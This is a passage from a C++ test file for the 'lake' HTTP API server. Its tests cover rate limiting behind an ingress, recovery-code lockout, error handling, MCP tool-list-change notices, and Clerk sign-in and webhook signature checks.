                                                 mcp ? "/mcp" : "/v1/recover_with_code",
                                                 payload.dump(),
                                                 "",
                                                 "HTTP/1.1",
                                                 "",
                                                 "application/json",
                                                 std::move(headers));
        EXPECT_FALSE(response.empty());
        return response.find("rate_limited") != std::string::npos;
    };
    for (int i = 0; i < 100; ++i) {
        EXPECT_FALSE(authenticate({{"X-Real-IP", "192.0.2.1"}})) << i;
    }
    EXPECT_TRUE(authenticate({{"X-Real-IP", "192.0.2.1"}}));
    // A second client behind the same proxy peer keeps its own budget, whether the ingress names
    // it in X-Real-IP or as the last X-Forwarded-For hop (the first hop is the sender's to write).
    EXPECT_FALSE(authenticate({{"X-Real-IP", "192.0.2.2"}}));
    EXPECT_FALSE(authenticate({{"X-Forwarded-For", "192.0.2.1, 192.0.2.3"}}));
    // A direct connection, with neither header, still has a budget.
    for (int i = 0; i < 100; ++i) {
        EXPECT_FALSE(authenticate({})) << i;
    }
    EXPECT_TRUE(authenticate({}));
    HttpConnection probe(server.port());
    EXPECT_NE(probe.request("GET", "/healthz").find("200 OK"), std::string::npos);
}

TEST(HttpServer, RecoveryWorkCannotBlockHealthOrTheSharedStoreConnection) {
    const auto uri = lake::test::postgres_uri();
    if (!uri)
        GTEST_SKIP() << "LAKE_TEST_DB_URI is not configured";
    constexpr auto instance_kek =
        "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
    auto store = std::shared_ptr<lake::control::Store>(
        lake::control::make_postgres_store(uri, instance_kek));
    auto identity = lake::test::test_identity("recovery-http-worker");
    lake::control::NewPasswordUser input{"lake",
                                         "recovery-probe@example.test",
                                         "a long test password",
                                         "Recovery",
                                         "test",
                                         identity.document};
    input.identity_proof = lake::test::prove_identity(*store, "lake", identity);
    const auto signed_up = store->sign_up_password(input);
    ASSERT_TRUE(signed_up) << signed_up.error().message;
    const auto enrolled = store->enroll_mfa(
        signed_up->session.user_id, "lake", {signed_up->session.id, input.password});
    ASSERT_TRUE(enrolled) << enrolled.error().message;
    const std::string wrong_code = "rc1_00000000000000000000000000000000";
    // Make a known selector point at a different code's valid hash: this wrong attempt reaches
    // the expensive verifier after the row lock is released, without knowing a recovery code.
    pqxx::connection lock_connection(uri);
    {
        pqxx::work setup(lock_connection);
        setup.exec_params(
            "UPDATE credentials SET subject = $2 WHERE kind = 'recovery' AND subject = $1",
            lake::control::identity_crypto::recovery_selector(enrolled->recovery_codes[0]),
            lake::control::identity_crypto::recovery_selector(wrong_code));
        setup.commit();
    }
    pqxx::work held(lock_connection);
    held.exec_params(
        "SELECT id FROM credentials WHERE kind = 'recovery' AND subject = $1 FOR UPDATE",
        lake::control::identity_crypto::recovery_selector(wrong_code));
    lake::api::ApiServer server({.port = 0, .store = store, .instance_kek = instance_kek});
    ASSERT_TRUE(server.start()) << server.reason();
    auto wrong = std::async(std::launch::async, [&] {
        HttpConnection connection(server.port());
        return connection.request(
            "POST",
            "/v1/recover_with_code",
            nlohmann::json{{"email", input.email}, {"code", wrong_code}}.dump(),
            "",
            "HTTP/1.1",
            "",
            "application/json");
    });
    bool waiting = false;
    pqxx::connection observer(uri);
    const auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(5);
    while (!waiting && std::chrono::steady_clock::now() < deadline) {
        pqxx::read_transaction query(observer);
        waiting =
            query
                .exec("SELECT EXISTS (SELECT 1 FROM pg_stat_activity WHERE datname = "
                      "current_database() "
                      "AND wait_event_type = 'Lock' AND cardinality(pg_blocking_pids(pid)) > 0)")[0]
                                                                                                 [0]
                .as<bool>();
        if (!waiting)
            std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
    auto health = std::async(std::launch::async, [&] {
        HttpConnection connection(server.port());
        return connection.request("GET", "/healthz");
    });
    auto store_read =
        std::async(std::launch::async, [&] { return store->get_user(signed_up->session.user_id); });
    const bool health_ready =
        health.wait_for(std::chrono::milliseconds(500)) == std::future_status::ready;
    const bool store_ready =
        store_read.wait_for(std::chrono::milliseconds(500)) == std::future_status::ready;
    // Always release the lock before assertions so the unfixed implementation fails promptly.
    held.abort();
    EXPECT_TRUE(waiting) << "recovery request never reached its locked credential";
    EXPECT_TRUE(health_ready) << "recovery blocked the HTTP executor";
    EXPECT_TRUE(store_ready) << "recovery held the shared store mutex";
    EXPECT_NE(health.get().find("200 OK"), std::string::npos);
    EXPECT_TRUE(store_read.get());
    EXPECT_NE(wrong.get().find("unauthenticated"), std::string::npos);
    // A loop of wrong codes now reaches the account budget instead of rehashing eight codes.
    for (int i = 0; i < 9; ++i) {
        HttpConnection attempt(server.port());
        const auto response =
            attempt.request("POST",
                            "/v1/recover_with_code",
                            nlohmann::json{{"email", input.email}, {"code", wrong_code}}.dump(),
                            "",
                            "HTTP/1.1",
                            "",
                            "application/json");
        EXPECT_NE(response.find("unauthenticated"), std::string::npos);
        HttpConnection probe(server.port());
        EXPECT_NE(probe.request("GET", "/healthz").find("200 OK"), std::string::npos);
    }
    // A correct unused code proves the account is cooling down; wrong and blocked guesses
    // deliberately have the same public response.
    HttpConnection correct(server.port());
    const auto blocked = correct.request(
        "POST",
        "/v1/recover_with_code",
        nlohmann::json{{"email", input.email}, {"code", enrolled->recovery_codes[1]}}.dump(),
        "",
        "HTTP/1.1",
        "",
        "application/json");
    EXPECT_NE(blocked.find("401"), std::string::npos);
    EXPECT_NE(blocked.find("unauthenticated"), std::string::npos);
    EXPECT_NE(blocked.find("invalid credentials"), std::string::npos);
    auto recovery_acknowledgement = [&](const std::string& email) {
        HttpConnection connection(server.port());
        const auto response = connection.request("POST",
                                                 "/v1/begin_email_recovery",
                                                 nlohmann::json{{"email", email}}.dump(),
                                                 "",
                                                 "HTTP/1.1",
                                                 "",
                                                 "application/json");
        return nlohmann::json::parse(response_body(response));
    };
    const auto known = recovery_acknowledgement(input.email);
    const auto unknown = recovery_acknowledgement("missing@example.test");
    EXPECT_TRUE(known.at("ok"));
    EXPECT_TRUE(unknown.at("ok"));
    EXPECT_EQ(known.at("value"), unknown.at("value"))
        << "account throttling must not reveal registered email";
    pqxx::read_transaction queued(observer);
    EXPECT_EQ(queued
                  .exec_params("SELECT count(*) FROM offline_recovery_attempts WHERE "
                               "user_id = $1::uuid AND method = 'email'",
                               signed_up->session.user_id)[0][0]
                  .as<int>(),
              1)
        << "verification lockout must still allow the account to begin email recovery";
}

} // namespace

TEST(HttpServer, ResponseResetPreservesCurrentProtocolAndCors) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.instance_kek = "response-reset-test-kek";
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();

    HttpConnection connection(server.port());
    const std::string preflight = connection.request("OPTIONS", "/sign-in", {}, {}, "HTTP/1.0");
    ASSERT_TRUE(preflight.starts_with("HTTP/1.0 204"));
    EXPECT_EQ(response_header(preflight, "connection"), "keep-alive");
    EXPECT_EQ(response_header(preflight, "access-control-allow-origin"), "*");
    EXPECT_FALSE(response_header(preflight, "access-control-allow-methods").empty());

    const std::string missing = connection.request("GET", "/missing-response-reset-route");
    ASSERT_TRUE(missing.starts_with("HTTP/1.1 404"));
    EXPECT_EQ(response_header(missing, "access-control-allow-origin"), "*");
    EXPECT_TRUE(response_header(missing, "access-control-allow-methods").empty());
    EXPECT_TRUE(response_header(missing, "connection").empty());

    const std::string healthy = connection.request("GET", "/healthz", {}, {}, "HTTP/1.0");
    ASSERT_TRUE(healthy.starts_with("HTTP/1.0 200"));
    EXPECT_EQ(response_header(healthy, "connection"), "keep-alive");
    EXPECT_EQ(response_header(healthy, "access-control-allow-origin"), "*");
    EXPECT_TRUE(response_header(healthy, "access-control-allow-methods").empty());
}

// lake#440: a handler that throws is answered 500 and logged with its route and request id; the
// connection stays open for the next request.
class ThrowingRoutes {
public:
    ThrowingRoutes() {
        namespace http = boost::http;
        http::router<http::route_params> router;
        const auto observe = [this](http::route_params&, const lake::api::RouteFailure& failure) {
            std::lock_guard lock(mutex_);
            failures_.push_back(failure);
        };
        // Throws while the handler is called, before any task exists.
        router.add(http::method::get,
                   "/throws-now",
                   lake::api::guard_route(
                       "/throws-now",
                       [](http::route_params&) -> http::route_task {
                           throw std::runtime_error("renderer failed before its task");
                       },
                       observe));
        // Throws inside the handler's task, as a renderer exception does.
        router.add(http::method::get,
                   "/throws-later",
                   lake::api::guard_route(
                       "/throws-later",
                       [](http::route_params& route) -> http::route_task {
                           route.res.set("X-Partial", "set before the throw");
                           const nlohmann::json row{{"digest", nullptr}};
                           // Throws: the key is present and null, not a string.
                           route.res.set("X-Digest", row.value("digest", std::string()));
                           co_return http::route_done;
                       },
                       observe));
        router.add(http::method::get,
                   "/fine",
                   lake::api::guard_route(
                       "/fine",
                       [](http::route_params& route) -> http::route_task {
                           route.status(http::status::ok);
                           route.res.set(http::field::content_type, "text/plain");
                           route.res.set_payload_size(2);
                           auto [error] = co_await route.send("ok");
                           if (error) {
                               co_return http::route_error(error);
                           }
                           co_return http::route_done;
                       },
                       observe));
        server_ = std::make_unique<boost::beast2::http_server>(
            io_context_,
            1,
            std::move(router),
            http::make_parser_config(http::parser_config{true}),
            http::make_serializer_config(http::serializer_config()));
        if (server_->bind(boost::corosio::endpoint(boost::corosio::ipv4_address("127.0.0.1"), 0))) {
            return;
        }
        port_ = server_->local_endpoint().port();
        server_->start();
        thread_ = std::thread([this] { io_context_.run(); });
    }

    ~ThrowingRoutes() {
        if (server_) {
            server_->stop();
        }
        io_context_.stop();
        if (thread_.joinable()) {
            thread_.join();
        }
    }

    [[nodiscard]] unsigned short port() const {
        return port_;
    }

    [[nodiscard]] std::vector<lake::api::RouteFailure> failures() const {
        std::lock_guard lock(mutex_);
        return failures_;
    }

private:
    boost::corosio::io_context io_context_;
    std::unique_ptr<boost::beast2::http_server> server_;
    std::thread thread_;
    unsigned short port_ = 0;
    mutable std::mutex mutex_;
    std::vector<lake::api::RouteFailure> failures_;
};

TEST(HttpServer, AHandlerThatThrowsIsAnswered500AndLogged) {
    ThrowingRoutes routes;
    ASSERT_NE(routes.port(), 0);
    HttpConnection connection(routes.port());

    const std::string page = connection.request(
        "GET", "/throws-now", {}, {}, "HTTP/1.1", {}, "text/plain",
        {{"Accept", "text/html,application/xhtml+xml"}});
    ASSERT_TRUE(page.starts_with("HTTP/1.1 500")) << page.substr(0, 300);
    EXPECT_EQ(response_header(page, "content-type"), "text/html; charset=utf-8");
    const std::string generated_id = response_header(page, "x-request-id");
    EXPECT_FALSE(generated_id.empty());
    EXPECT_NE(page.find("We Could Not Load This Page"), std::string::npos);
    EXPECT_NE(page.find("Request id: " + generated_id), std::string::npos);
    EXPECT_EQ(page.find("renderer failed"), std::string::npos);

    // Same connection: the failure did not drop it.
    const std::string api = connection.request(
        "GET", "/throws-later", {}, {}, "HTTP/1.1", {}, "text/plain",
        {{"Accept", "application/json"}, {"X-Request-Id", "request-440"}});
    ASSERT_TRUE(api.starts_with("HTTP/1.1 500")) << api.substr(0, 300);
    EXPECT_EQ(response_header(api, "content-type"), "application/json; charset=utf-8");
    EXPECT_EQ(response_header(api, "x-request-id"), "request-440");
    EXPECT_TRUE(response_header(api, "x-partial").empty());
    const nlohmann::json envelope = nlohmann::json::parse(response_body(api));
    EXPECT_EQ(envelope["ok"], false);
    EXPECT_EQ(envelope["error"]["code"], "internal_error");
    EXPECT_NE(envelope["error"]["message"].get<std::string>().find("request-440"),
              std::string::npos);

    const std::string fine = connection.request("GET", "/fine");
    ASSERT_TRUE(fine.starts_with("HTTP/1.1 200")) << fine.substr(0, 300);
    EXPECT_EQ(response_body(fine), "ok");

    const auto failures = routes.failures();
    ASSERT_EQ(failures.size(), 2U);
    EXPECT_EQ(failures[0].route, "/throws-now");
    EXPECT_EQ(failures[0].method, "GET");
    EXPECT_EQ(failures[0].request_id, generated_id);
    EXPECT_EQ(failures[0].message, "renderer failed before its task");
    EXPECT_EQ(failures[1].route, "/throws-later");
    EXPECT_EQ(failures[1].path, "/throws-later");
    EXPECT_EQ(failures[1].request_id, "request-440");
    EXPECT_NE(failures[1].message.find("type must be string"), std::string::npos);

    const nlohmann::json line = nlohmann::json::parse(lake::api::route_failure_log_line(failures[1]));
    EXPECT_EQ(line["level"], "error");
    EXPECT_EQ(line["event"], "handler_exception");
    EXPECT_EQ(line["route"], "/throws-later");
    EXPECT_EQ(line["request_id"], "request-440");
    EXPECT_EQ(line["error"], failures[1].message);
}

// lake#441: a client learns that lake's tools changed instead of keeping a stale list.
TEST(HttpServer, McpSessionsLearnThatTheToolListChanged) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.instance_kek = "mcp-list-changed-test-kek";
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    const auto body_of = [](const std::string& response) {
        return response.substr(response.find("\r\n\r\n") + 4);
    };
    const std::vector<std::pair<std::string, std::string>> accepts_events = {
        {"Accept", "application/json, text/event-stream"}};

    const std::string initialized = connection.request(
        "POST",
        "/mcp",
        R"({"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"1"}}})",
        {}, "HTTP/1.1", {}, "application/json", accepts_events);
    ASSERT_TRUE(initialized.starts_with("HTTP/1.1 200")) << initialized.substr(0, 300);
    EXPECT_EQ(nlohmann::json::parse(body_of(initialized))["result"]["capabilities"]["tools"]
                                                         ["listChanged"],
              true);
    const std::string session = response_header(initialized, "mcp-session-id");
    ASSERT_FALSE(session.empty());
    // The session names this build's tool list: 64 hex digest characters, a dot, 32 random ones.
    ASSERT_EQ(session.size(), 64U + 1U + 32U) << session;
    EXPECT_EQ(session[64], '.');

    const std::string call =
        R"({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"server_info","arguments":{}}})";
    auto with_session = accepts_events;
    with_session.emplace_back("Mcp-Session-Id", session);
    const std::string current =
        connection.request("POST", "/mcp", call, {}, "HTTP/1.1", {}, "application/json", with_session);
    ASSERT_TRUE(current.starts_with("HTTP/1.1 200")) << current.substr(0, 300);
    EXPECT_EQ(response_header(current, "content-type"), "application/json; charset=utf-8");
    EXPECT_EQ(body_of(current).find("list_changed"), std::string::npos);
    EXPECT_TRUE(response_header(current, "mcp-session-id").empty());

    // A session that began on another tool list — lake was upgraded since — is told, ahead of the
    // response it asked for.
    auto stale = accepts_events;
    stale.emplace_back("Mcp-Session-Id", std::string(64, '0') + "." + std::string(32, '1'));
    const std::string changed =
        connection.request("POST", "/mcp", call, {}, "HTTP/1.1", {}, "application/json", stale);
    ASSERT_TRUE(changed.starts_with("HTTP/1.1 200")) << changed.substr(0, 300);
    EXPECT_EQ(response_header(changed, "content-type"), "text/event-stream");
    const std::string events = body_of(changed);
    const std::string notice =
        "event: message\ndata: {\"jsonrpc\":\"2.0\",\"method\":\"notifications/tools/list_changed\"}"
        "\n\n";
    ASSERT_TRUE(events.starts_with(notice)) << events.substr(0, 300);
    const std::string second = events.substr(notice.size());
    ASSERT_TRUE(second.starts_with("event: message\ndata: ")) << second.substr(0, 300);
    ASSERT_TRUE(second.ends_with("\n\n"));
    const auto reply = nlohmann::json::parse(
        second.substr(std::string_view("event: message\ndata: ").size(),
                      second.size() - std::string_view("event: message\ndata: ").size() - 2));
    EXPECT_EQ(reply["id"], 2);
    EXPECT_EQ(reply["result"]["isError"], false);

    // tools/list is the fresh list itself, so refetching on the notice is not told again.
    const std::string relisted = connection.request(
        "POST", "/mcp", R"({"jsonrpc":"2.0","id":3,"method":"tools/list"})", {}, "HTTP/1.1", {},
        "application/json", stale);
    ASSERT_TRUE(relisted.starts_with("HTTP/1.1 200")) << relisted.substr(0, 300);
    EXPECT_EQ(response_header(relisted, "content-type"), "application/json; charset=utf-8");
    EXPECT_FALSE(nlohmann::json::parse(body_of(relisted))["result"]["tools"].empty());

    // A client that accepts only JSON still gets its plain response.
    const std::string json_only = connection.request(
        "POST", "/mcp", call, {}, "HTTP/1.1", {}, "application/json",
        {{"Accept", "application/json"},
         {"Mcp-Session-Id", std::string(64, '0') + "." + std::string(32, '1')}});
    ASSERT_TRUE(json_only.starts_with("HTTP/1.1 200")) << json_only.substr(0, 300);
    EXPECT_EQ(nlohmann::json::parse(body_of(json_only))["id"], 2);

    // No standalone event stream and no session to delete: 405, never a 404 that reads as an
    // expired session.
    for (const std::string_view method : {"GET", "DELETE"}) {
        const std::string refused =
            connection.request(method, "/mcp", {}, {}, "HTTP/1.1", {}, "application/json",
                               with_session);
        EXPECT_TRUE(refused.starts_with("HTTP/1.1 405")) << method << refused.substr(0, 300);
        EXPECT_EQ(response_header(refused, "allow"), "POST");
    }
}

// lake#684: a workspace's endpoint also lists the tools its connections re-export, so a session
// that began there is told when one is exported or what it exports changes, and is not told again
// once it has listed the new tools.
TEST(HttpServer, WorkspaceMcpSessionsLearnThatExportedToolsChanged) {
    auto store = std::make_shared<lake::control::InMemoryStore>();
    const auto user = store->create_user({"taap:mcp-exports", "", "Exports"});
    ASSERT_TRUE(user);
    const auto customer = store->create_customer({"individual", user->id, "", "mcp-exports"});
    ASSERT_TRUE(customer);
    lake::test::StreamWorkspace workspace(store, customer->id);
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.store = store;
    options.workspaces = workspace.service;
    options.admin_token = "mcp-exports-operator";
    options.instance_kek = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff";
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    const std::string path = "/w/" + workspace.id + "/mcp";
    const auto post = [&](const std::string& body, const std::string& session) {
        std::vector<std::pair<std::string, std::string>> headers = {
            {"Accept", "application/json, text/event-stream"}};
        if (!session.empty()) {
            headers.emplace_back("Mcp-Session-Id", session);
        }
        return connection.request("POST", path, body, {}, "HTTP/1.1", "mcp-exports-operator",
                                  "application/json", headers);
    };
    const auto told = [](const std::string& response) {
        return response_header(response, "content-type") == "text/event-stream" &&
               response.find("notifications/tools/list_changed") != std::string::npos;
    };
    const std::string initialize =
        R"({"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"test","version":"1"}}})";
    const std::string call =
        R"({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"server_info","arguments":{}}})";
    const std::string list = R"({"jsonrpc":"2.0","id":3,"method":"tools/list"})";
    const auto export_digest = [&](const std::string& digest) {
        EXPECT_TRUE(store->put_mcp_connection_dispatch({.customer_id = customer->id,
                                                        .workspace_id = workspace.id,
                                                        .connection_id = "connection-1",
                                                        .exported_digest = digest}));
    };

    const std::string initialized = post(initialize, "");
    ASSERT_TRUE(initialized.starts_with("HTTP/1.1 200")) << initialized.substr(0, 300);
    const std::string session = response_header(initialized, "mcp-session-id");
    ASSERT_EQ(session.size(), 64U + 1U + 32U) << session;
    EXPECT_FALSE(told(post(call, session))) << "nothing changed";

    // A connection is exported: the next request is told, ahead of its answer, until it lists.
    export_digest(std::string(64, 'a'));
    const std::string after_export = post(call, session);
    ASSERT_TRUE(after_export.starts_with("HTTP/1.1 200")) << after_export.substr(0, 300);
    EXPECT_TRUE(told(after_export)) << after_export.substr(0, 400);
    EXPECT_TRUE(told(post(call, session))) << "told until it lists again";

    // It lists: no more notices, until an allow-list change changes what is exported.
    const std::string listed = post(list, session);
    ASSERT_TRUE(listed.starts_with("HTTP/1.1 200")) << listed.substr(0, 300);
    EXPECT_FALSE(told(listed)) << "tools/list is the fresh list itself";
    EXPECT_FALSE(told(post(call, session)));
    export_digest(std::string(64, 'b'));
    EXPECT_TRUE(told(post(call, session))) << "an allow-list change";
    ASSERT_TRUE(post(list, session).starts_with("HTTP/1.1 200"));
    EXPECT_FALSE(told(post(call, session)));

    // Not exported any more: told again, and a new session begins on Lake's own list.
    ASSERT_TRUE(store->remove_mcp_connection_dispatch(workspace.id, "connection-1"));
    EXPECT_TRUE(told(post(call, session)));
    const std::string fresh = response_header(post(initialize, ""), "mcp-session-id");
    EXPECT_EQ(fresh.substr(0, 64), session.substr(0, 64)) << "Lake's own digest, as at first";
    EXPECT_FALSE(told(post(call, fresh)));
}

// With Clerk, the web app mounts Clerk's sign-in (docs/api/clerk.md); lake keeps the exchange and
// sends sign-out through Clerk's page so its session ends too.
TEST(HttpServer, ClerkExchangeRefusesAForgedTokenAndSignOutEndsClerkToo) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.instance_kek = "clerk-http-test-kek";
    options.store = std::make_shared<lake::control::InMemoryStore>();
    // base64("127.0.0.1$"); the isolated JWKS response trusts no signing keys.
    options.clerk_publishable_key = "pk_test_MTI3LjAuMC4xJA";
    options.clerk_http = [](const auto&, const auto&) {
        return lake::api::ClerkResponse{200, R"({"keys":[]})", ""};
    };
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());

    const auto viewer =
        nlohmann::json::parse(response_body(connection.request("GET", "/v1/viewer")))["value"];
    EXPECT_EQ(viewer["clerk"]["enabled"], true);
    EXPECT_EQ(viewer["clerk"]["publishable_key"], "pk_test_MTI3LjAuMC4xJA");
    EXPECT_EQ(viewer["password_sign_up"], false);
    // lake#1098: and the API agrees. Password sign-up in the Lake pool is refused, with no
    // session cookie, so an address Clerk would refuse gets no account.
    const std::string sign_up =
        connection.request("POST",
                           "/v1/sign_up_password",
                           R"({"email":"outsider@example.com","password":"correct horse battery"})",
                           {},
                           "HTTP/1.1",
                           {},
                           "application/json");
    ASSERT_TRUE(sign_up.starts_with("HTTP/1.1 403")) << sign_up.substr(0, 400);
    EXPECT_EQ(nlohmann::json::parse(response_body(sign_up))["error"]["code"], "forbidden");
    EXPECT_TRUE(response_header(sign_up, "set-cookie").empty());
    const std::string sign_in =
        connection.request("POST",
                           "/v1/sign_in_password",
                           R"({"email":"outsider@example.com","password":"correct horse battery"})",
                           {},
                           "HTTP/1.1",
                           {},
                           "application/json");
    ASSERT_TRUE(sign_in.starts_with("HTTP/1.1 403")) << sign_in.substr(0, 400);
    EXPECT_TRUE(response_header(sign_in, "set-cookie").empty());
    // Clerk's sign-in shows its images from Clerk's image host, and from nowhere else (lake#943).
    const std::string page = connection.request(
        "GET", "/sign-in", {}, {}, "HTTP/1.1", {}, "text/plain", {{"Accept", "text/html"}});
    ASSERT_TRUE(page.starts_with("HTTP/1.1 200")) << page.substr(0, 300);
    EXPECT_EQ(response_header(page, "content-security-policy"),
              "frame-ancestors 'self'; img-src 'self' data: https://img.clerk.com");

    const std::string refused =
        connection.request("POST", "/identity/clerk-session", "token=not.a.jwt&device_name=b");
    ASSERT_TRUE(refused.starts_with("HTTP/1.1 302")) << refused;
    EXPECT_TRUE(response_header(refused, "location").starts_with("/sign-in?error="));
    EXPECT_TRUE(response_header(refused, "set-cookie").empty());

    const std::string signed_out = connection.request("POST", "/logout");
    EXPECT_EQ(response_header(signed_out, "location"), "/sign-in?signed_out=1");
}

// Every request arrives from the same socket peer, as it does behind the ingress: each address the
// ingress reports gets its own 60 attempts, and clients without one share the direct bucket.
TEST(HttpServer, ClerkInvalidTokensNeverFetchAndEachIngressClientHasItsOwnLimit) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.store = std::make_shared<lake::control::InMemoryStore>();
    options.clerk_publishable_key = "pk_test_MTI3LjAuMC4xJA";
    std::atomic<unsigned> fetches = 0;
    options.oidc_jwks_fetch = [&](const auto&, bool) -> std::optional<std::string> {
        ++fetches;
        return R"({"keys":[]})";
    };
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    const auto attempt = [&](std::vector<std::pair<std::string, std::string>> headers) {
        HttpConnection connection(server.port());
        return connection.request("POST",
                                  "/identity/clerk-session",
                                  "token=not.a.jwt",
                                  {},
                                  "HTTP/1.1",
                                  {},
                                  "application/x-www-form-urlencoded",
                                  std::move(headers));
    };
    const std::vector<std::vector<std::pair<std::string, std::string>>> clients = {
        {{"X-Real-IP", "192.0.2.1"}, {"X-Forwarded-For", "198.51.100.1, 192.0.2.1"}},
        {{"X-Real-IP", "192.0.2.2"}},
        {},
    };
    for (const auto& headers : clients) {
        for (unsigned i = 0; i < 61; ++i) {
            const auto response = attempt(headers);
            EXPECT_TRUE(response.starts_with(i < 60 ? "HTTP/1.1 302" : "HTTP/1.1 429")) << response;
            EXPECT_TRUE(response_header(response, "set-cookie").empty());
        }
    }
    EXPECT_EQ(fetches, 0U);
}

TEST(HttpServer, ClerkJwksFetchDoesNotBlockOtherRequests) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 2;
    options.store = std::make_shared<lake::control::InMemoryStore>();
    options.clerk_publishable_key = "pk_test_MTI3LjAuMC4xJA";
    std::promise<void> entered;
    auto entered_future = entered.get_future();
    std::promise<void> release;
    auto released = release.get_future();
    options.oidc_jwks_fetch = [&](const auto&, bool) -> std::optional<std::string> {
        entered.set_value();
        released.wait();
        return std::nullopt;
    };
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    const auto now = std::chrono::duration_cast<std::chrono::seconds>(
                         std::chrono::system_clock::now().time_since_epoch())
                         .count();
    const auto encode = lake::control::identity_crypto::base64url_encode;
    const auto token = encode(R"({"alg":"RS256","kid":"unknown"})") + "." +
                       encode(nlohmann::json{{"iss", "https://127.0.0.1"},
                                             {"aud", "lake"},
                                             {"sub", "user"},
                                             {"iat", now},
                                             {"exp", now + 300}}
                                  .dump()) +
                       ".AA";
    auto exchange = std::async(std::launch::async, [&] {
        HttpConnection client(server.port());
        return client.request("POST", "/identity/clerk-session", "token=" + token);
    });
    const auto started = entered_future.wait_for(std::chrono::seconds(5));
    EXPECT_EQ(started, std::future_status::ready);
    auto probe = std::async(std::launch::async, [&] {
        HttpConnection client(server.port());
        return client.request("GET", "/healthz");
    });
    const auto responsive = probe.wait_for(std::chrono::seconds(2));
    release.set_value();
    EXPECT_EQ(responsive, std::future_status::ready);
    EXPECT_TRUE(probe.get().starts_with("HTTP/1.1 200"));
    EXPECT_TRUE(exchange.get().starts_with("HTTP/1.1 302"));
}

TEST(HttpServer, ClerkSessionExchangeIsAbsentWithoutClerk) {
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.instance_kek = "clerk-off-http-test-kek";
    options.store = std::make_shared<lake::control::InMemoryStore>();
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    EXPECT_TRUE(connection.request("POST", "/identity/clerk-session", "token=x")
                    .starts_with("HTTP/1.1 404"));
    EXPECT_EQ(response_header(connection.request("POST", "/logout"), "location"), "/");
}

// Clerk's user events (lake#765): the route exists only with LAKE_CLERK_WEBHOOK_SECRET, takes
// Svix's headers and answers 401 to a forged delivery.
TEST(HttpServer, ClerkWebhookIsSignedAndAbsentWithoutItsSecret) {
    const std::string secret = "whsec_bGFrZSBjbGVyayB3ZWJob29rIHRlc3Qgc2VjcmV0ISE=";
    const std::string body =
        R"({"type":"user.created","timestamp":1,"object":"event","data":{"banned":false,"locked":false,"id":"user_http","first_name":"H",)"
        R"("primary_email_address_id":"idn_1","email_addresses":[{"id":"idn_1",)"
        R"("email_address":"http-hook@example.test","verification":{"status":"verified"}}]}})";
    const std::string timestamp =
        std::to_string(std::chrono::duration_cast<std::chrono::seconds>(
                           std::chrono::system_clock::now().time_since_epoch())
                           .count());
    lake::api::clerk_webhooks::Delivery delivery{"msg_http", timestamp, "", body};
    const std::vector<std::pair<std::string, std::string>> headers = {
        {"svix-id", "msg_http"},
        {"svix-timestamp", timestamp},
        {"svix-signature", "v1," + lake::api::clerk_webhooks::sign(secret, delivery)}};
    {
        lake::api::ServerOptions options;
        options.port = 0;
        options.worker_coroutines = 1;
        options.instance_kek = "clerk-webhook-off-kek";
        options.store = std::make_shared<lake::control::InMemoryStore>();
        lake::api::ApiServer server(options);
        ASSERT_TRUE(server.start()) << server.reason();
        HttpConnection connection(server.port());
        EXPECT_TRUE(connection
                        .request("POST",
                                 "/identity/clerk-webhook",
                                 body,
                                 {},
                                 "HTTP/1.1",
                                 {},
                                 "application/json",
                                 headers)
                        .starts_with("HTTP/1.1 404"));
    }
    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.instance_kek = "clerk-webhook-on-kek";
    options.clerk_webhook_secret = secret;
    auto store = std::make_shared<lake::control::InMemoryStore>();
    options.store = store;
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();
    HttpConnection connection(server.port());
    auto forged = headers;
    forged[2].second = "v1,AAAA";
    EXPECT_TRUE(connection
                    .request("POST",
                             "/identity/clerk-webhook",
                             body,
                             {},
                             "HTTP/1.1",
                             {},
                             "application/json",
                             forged)
                    .starts_with("HTTP/1.1 401"));
    const std::string accepted = connection.request(
        "POST", "/identity/clerk-webhook", body, {}, "HTTP/1.1", {}, "application/json", headers);
    ASSERT_TRUE(accepted.starts_with("HTTP/1.1 200")) << accepted;
    EXPECT_EQ(nlohmann::json::parse(response_body(accepted)).at("created"), true);
    const auto users = store->list_users(10);
    ASSERT_TRUE(users);
    EXPECT_TRUE(std::ranges::any_of(
        *users, [](const auto& row) { return row.email == "http-hook@example.test"; }));
}

TEST(HttpServer, IdleKeepAliveCloseWritesNothingToStderr) {
    OutputPipe captured_stderr;
    ASSERT_TRUE(captured_stderr.ready());

    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.node_name = "idle-close-test";
    options.admin_token = "idle-close-admin";
    options.instance_kek = "idle-close-instance-kek";
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();

    const int keep_alive = connect_loopback(server.port());
